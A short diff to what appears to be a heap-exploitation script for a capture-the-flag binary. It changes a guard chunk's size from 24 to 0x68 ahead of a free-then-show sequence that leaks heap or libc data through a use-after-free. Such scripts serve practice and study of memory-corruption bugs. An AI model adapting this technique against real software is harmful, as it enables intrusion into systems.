@@ -107,7 +107,7 @@ def free(index: int):
 sh = start()
 
 malloc(0, b'A' * 8, 0x200, b'A' * 8)
-malloc(1, b'B' * 8, 24, b'B' * 8) # allocate another small junk to prevent consolidation with the top chunk.
+malloc(1, b'B' * 8, 0x68, b'B' * 8) # allocate another small junk to prevent consolidation with the top chunk.
 
 free(0)
 show(0)
